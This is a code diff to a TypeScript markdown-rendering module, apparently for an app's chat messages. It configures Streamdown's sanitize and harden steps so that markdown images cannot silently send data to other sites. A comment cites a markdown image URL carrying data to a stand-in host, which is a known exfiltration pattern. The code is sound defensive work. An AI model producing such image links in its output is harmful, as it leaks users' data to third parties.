@@ -367,44 +367,74 @@ export const streamdownRemend = { htmlTags: false };
 // ![x](https://host/?d=...) sends data out with no click. Streamdown's
 // default harden step allows every image prefix, so this keeps its
 // raw → sanitize → harden pipeline and sets allowedImagePrefixes to [], which
-// blocks every <img> that markdown can produce. Before that step, an image
-// to another site becomes a link (its alt text, else its address) that the
-// learner can open: Streamdown's link button asks before it navigates. The
-// app's own images (figures, drawings, photos, page images) are separate
-// <img> elements that do not render through markdown. data: images are
-// already blocked by the sanitize step.
+// blocks every <img> that markdown can produce, with three deliberate changes:
+//   - before harden, an image to another site (http(s) or protocol-relative)
+//     becomes a link (its alt text, else its address) that the learner can
+//     open: Streamdown's link button asks before it navigates. Inside an
+//     existing link it becomes plain text instead, never a nested link;
+//   - data: raster images (png, jpeg, gif, webp) display: they make no
+//     network request. The sanitize step is told to keep a data: src, and
+//     harden's own allowDataImages switch (already on in Streamdown's default
+//     options) lets it through; other data: types (svg, html, ...) are dropped
+//     here;
+//   - relative and same-origin addresses stay blocked: an <img> pointed at
+//     one of the app's own GET routes would call it.
+// The app's own images (figures, drawings, photos, page images) are separate
+// <img> elements that do not render through markdown. The plugins are named
+// explicitly, in the order needed, so a Streamdown upgrade that reorders or
+// adds a default cannot change the pipeline unnoticed (a test pins the
+// default's shape).
 type HastNode = { type: string; tagName?: string; properties?: Record<string, unknown>; children?: HastNode[] };
 
+const RASTER_DATA_IMAGE = /^data:image\/(?:png|jpeg|gif|webp)[;,]/;
+const REMOTE_IMAGE = /^(?:https?:)?\/\/[^/\s]/i;
+
 function imageToLink(root: HastNode): void {
-  const walk = (node: HastNode) => {
-    node.children?.forEach((child, i) => {
-      if (child.type === "element" && child.tagName === "img") {
-        const src = String(child.properties?.src ?? "");
-        if (/^https?:\/\//i.test(src)) {
-          const alt = String(child.properties?.alt ?? "").trim();
-          node.children![i] = {
-            type: "element",
-            tagName: "a",
-            properties: { href: src },
-            children: [{ type: "text", value: alt || src } as HastNode],
-          };
-          return;
-        }
+  const walk = (node: HastNode, inLink: boolean) => {
+    node.children = node.children?.flatMap((child): HastNode[] => {
+      if (child.type !== "element") return [child];
+      // A <source srcset> inside <picture> would load a remote image for a
+      // data: <img> next to it; <picture> adds nothing without it.
+      if (child.tagName === "source") return [];
+      if (child.tagName === "picture") {
+        walk(child, inLink);
+        return child.children ?? [];
       }
-      walk(child);
+      if (child.tagName !== "img") {
+        walk(child, inLink || child.tagName === "a");
+        return [child];
+      }
+      const src = String(child.properties?.src ?? "");
+      if (src.startsWith("data:")) {
+        // Harden's own switch would also pass data:image/svg+xml.
+        const { srcSet: _a, srcset: _b, ...properties } = child.properties ?? {};
+        child.properties = RASTER_DATA_IMAGE.test(src) ? properties : { ...properties, src: "" };
+        return [child];
+      }
+      if (!REMOTE_IMAGE.test(src)) return [child];
+      const href = src.startsWith("//") ? `https:${src}` : src;
+      const alt = String(child.properties?.alt ?? "").trim();
+      const text = { type: "text", value: alt || href } as HastNode;
+      return [inLink ? text : { type: "element", tagName: "a", properties: { href }, children: [text] }];
     });
   };
-  walk(root);
+  walk(root, false);
 }
 
-const [hardenPlugin, hardenOptions] = defaultRehypePlugins.harden as [unknown, Record<string, unknown>];
-// Spreading keeps `harden` in its original slot (after sanitize), so
-// imageToLink is inserted explicitly in front of it.
-const { harden: _harden, ...beforeHarden } = defaultRehypePlugins;
+const { raw, sanitize, harden } = defaultRehypePlugins as Record<"raw" | "sanitize" | "harden", unknown>;
+const [sanitizePlugin, sanitizeSchema] = sanitize as [unknown, { protocols?: Record<string, string[]> }];
+const [hardenPlugin, hardenOptions] = harden as [unknown, Record<string, unknown>];
 export const streamdownRehypePlugins = [
-  ...Object.values(beforeHarden),
+  raw,
+  [
+    sanitizePlugin,
+    {
+      ...sanitizeSchema,
+      protocols: { ...sanitizeSchema.protocols, src: [...(sanitizeSchema.protocols?.src ?? []), "data"] },
+    },
+  ],
   () => imageToLink,
-  [hardenPlugin, { ...hardenOptions, allowedImagePrefixes: [] }],
+  [hardenPlugin, { ...hardenOptions, allowedImagePrefixes: [], allowDataImages: true }],
 ] as NonNullable<StreamdownProps["rehypePlugins"]>;
 
 export const MessageResponse = memo(
